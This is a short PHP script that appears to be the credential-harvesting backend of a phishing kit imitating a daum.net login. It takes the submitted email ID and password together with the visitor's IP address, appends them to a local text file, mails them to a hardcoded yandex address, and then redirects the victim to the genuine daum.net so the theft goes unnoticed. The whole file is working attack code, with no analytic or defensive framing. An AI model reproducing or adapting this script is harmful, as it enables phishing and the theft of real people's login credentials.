<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "=========[ BY ERSFH]=========\n";
$message .= "EMAIL ID	  : ".$_POST['id']."\n";
$message .= "Password	: ".$_POST['pw']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";

$message .= "==========[BY ERSF]=========";

$to = "mrmalcolm42028@yandex.com";
$subject = "daum.net Login Details [$ip]";
$headers = "From:  daum <mrmalcolm42028@yandex.com,mrmalcolm42028@gmail.com>";
$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);


header("Location:http://daum.net/");
?>